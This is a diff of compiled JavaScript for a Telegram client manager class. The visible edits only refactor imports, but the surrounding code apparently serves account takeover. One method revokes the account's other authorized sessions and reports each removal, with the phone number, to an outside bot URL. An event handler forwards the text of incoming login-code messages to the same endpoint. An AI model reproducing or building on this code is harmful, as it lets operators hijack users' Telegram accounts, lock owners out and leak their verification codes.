@@ -33,11 +33,14 @@ const tl_1 = require("telegram/tl");
 const axios_1 = __importDefault(require("axios"));
 const fs = __importStar(require("fs"));
 const uploads_1 = require("telegram/client/uploads");
-const utils_1 = require("../../utils");
 const Helpers_1 = require("telegram/Helpers");
 const Logger_1 = require("telegram/extensions/Logger");
 const IMap_1 = require("../../IMap/IMap");
 const big_integer_1 = __importDefault(require("big-integer"));
+const utils_1 = require("../../utils");
+const parseError_1 = require("../../utils/parseError");
+const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
+const logbots_1 = require("../../utils/logbots");
 class TelegramManager {
     constructor(sessionString, phoneNumber) {
         this.session = new sessions_1.StringSession(sessionString);
@@ -188,7 +191,7 @@ class TelegramManager {
         return me;
     }
     async errorHandler(error) {
-        (0, utils_1.parseError)(error);
+        (0, parseError_1.parseError)(error);
         if (error.message && error.message == 'TIMEOUT') {
         }
         else {
@@ -348,7 +351,7 @@ class TelegramManager {
                     }
                 }
                 catch (error) {
-                    (0, utils_1.parseError)(error);
+                    (0, parseError_1.parseError)(error);
                 }
             }
         }
@@ -382,7 +385,7 @@ class TelegramManager {
         }
         catch (error) {
             console.error("Error adding contacts:", error);
-            (0, utils_1.parseError)(error, `Failed to save contacts`);
+            (0, parseError_1.parseError)(error, `Failed to save contacts`);
         }
     }
     async addContacts(mobiles, namePrefix) {
@@ -407,7 +410,7 @@ class TelegramManager {
         }
         catch (error) {
             console.error("Error adding contacts:", error);
-            (0, utils_1.parseError)(error, `Failed to save contacts`);
+            (0, parseError_1.parseError)(error, `Failed to save contacts`);
         }
     }
     async leaveChannels(chats) {
@@ -424,7 +427,7 @@ class TelegramManager {
                 }
             }
             catch (error) {
-                const errorDetails = (0, utils_1.parseError)(error);
+                const errorDetails = (0, parseError_1.parseError)(error);
                 console.log("Failed to leave channel :", errorDetails.message);
             }
         }
@@ -453,7 +456,7 @@ class TelegramManager {
                 continue;
             }
             else {
-                await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
+                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                 await this.resetAuthorization(auth);
             }
         }
@@ -639,7 +642,7 @@ class TelegramManager {
                 console.log(event.message.text.toLowerCase());
                 console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                 console.log("Date :", new Date(event.message.date * 1000));
-                await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(event.message.text)}`);
+                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.ppplbot)()}&text=${encodeURIComponent(event.message.text)}`);
             }
         }
     }
@@ -1106,7 +1109,7 @@ class TelegramManager {
                                 });
                             },
                             onEmailCodeError: (e) => {
-                                console.error('Email code error:', (0, utils_1.parseError)(e));
+                                console.error('Email code error:', (0, parseError_1.parseError)(e));
                                 return Promise.resolve("error");
                             }
                         });
@@ -1118,7 +1121,7 @@ class TelegramManager {
                 }, 5000);
             }
             catch (e) {
-                console.error("Unable to connect to mail server:", (0, utils_1.parseError)(e));
+                console.error("Unable to connect to mail server:", (0, parseError_1.parseError)(e));
             }
         }
         else {
